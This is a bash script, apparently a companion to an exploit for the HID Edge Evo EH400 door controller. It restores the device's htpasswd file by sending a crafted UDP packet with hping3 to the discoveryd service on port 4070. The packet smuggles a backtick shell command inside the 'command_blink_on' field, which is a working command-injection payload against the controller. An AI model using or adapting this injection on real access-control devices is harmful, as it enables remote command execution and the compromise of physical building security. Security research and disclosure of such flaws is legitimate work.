#!/bin/bash
#################################################################################
# Writen by Mike Kelly								#
# twitter.com/lixmk								#
# github.com/lixmk								#
# exfil.co									#
#                                                                               #
#	###########################################################		#
#	# HID Discoveryd htpasswd modifier for the Edge Evo EH400 #		#
#	#                                                         #		#
#	#    Restores the htpasswd file from backup created by    #		#
#	#              the EH400-exploit.sh script.               #		#
#	###########################################################		#
#										#
#	This program is free software: you can redistribute it and/or modify	#
#	it under the terms of the GNU General Public License as published by	#
#	the Free Software Foundation, either version 3 of the License, or	#
#	at your option) any later version.					#
#										#
#	This program is distributed in the hope that it will be useful,		#
#	but WITHOUT ANY WARRANTY; without even the implied warranty of		#
#	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the		#
#	GNU General Public License for more details.				#
#										#
#	You should have received a copy of the GNU General Public License	#
#	along with this program.  If not, see <http://www.gnu.org/licenses/>. 	#
#										#
#################################################################################

echo -e "\e[1;31m############################################################\e[0m"
echo -e "\e[1;31m#\e[0m                                                          \e[1;31m#\e[0m"
echo -e "\e[1;31m#\e[0m      This script will restore the htdigest password      \e[1;31m#\e[0m"
echo -e "\e[1;31m#\e[0m     for the targeted Edge Evo EH400 door controller.     \e[1;31m#\e[0m"
echo -e "\e[1;31m#\e[0m                                                          \e[1;31m#\e[0m"
echo -e "\e[1;31m#\e[0m            Variables need to be set manually             \e[1;31m#\e[0m"
echo -e "\e[1;31m#\e[0m    CTRL-C now to set vars or press ENTER to continue.    \e[1;31m#\e[0m"
echo -e "\e[1;31m#\e[0m                                                          \e[1;31m#\e[0m"
echo -e "\e[1;31m############################################################\e[0m"
read -e NULL

# Set the follwoing 2 variables
TARGET='Target IP'
TMAC='Target MAC'
# 

CMDEXEC=`which hping3`

echo "[*] Creating Data file"
echo 'command_blink_on;044;'${TMAC}';1`mv /tmp/htbak /etc/sysconfig/.htpasswd`;' > cleanup1.txt
echo "[*] Data file created"
echo "[*] Executing"

echo "[*] Sending Payload"
${CMDEXEC} -2 -p 4070 -c 1 -E cleanup1.txt -d 150 ${TARGET} 2> /dev/null
echo ""

echo "[*] Cleanup Attempt complete"
echo "[*] Verify by attempting login https://${TARGET}/"
